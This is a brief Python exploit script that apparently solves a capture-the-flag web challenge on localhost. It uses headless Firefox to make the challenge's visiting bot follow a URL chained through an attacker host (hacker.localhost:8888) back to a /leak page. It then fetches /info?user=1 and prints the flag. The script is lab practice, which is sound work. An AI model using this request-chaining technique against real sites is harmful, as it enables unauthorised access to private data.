import urllib.parse
import requests
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
import time

site = "http://challenge.localhost"
url = f"{site}/visit?url=http://hacker.localhost:8888/visit?url={site}/leak"

# Set up Selenium WebDriver for Firefox.
options = FirefoxOptions()                                                                                                
options.add_argument("--headless")                                                                                                                                                                                                                  
service = FirefoxService(log_path="/dev/null")                                                                             
driver = webdriver.Firefox(service=service, options=options) 

try:
    # Visit the URL with the injected payload
    driver.get(url)
    
    time.sleep(5)

    method = "GET"
    params = {"user": 1}
    path = "info"
    port = 80
    url = f"{site}:{port}/{path}"
    response = requests.request(method, url, params = params)

    print(f"Flag: {response.text}")

finally:
    # Close the browser
    driver.quit()
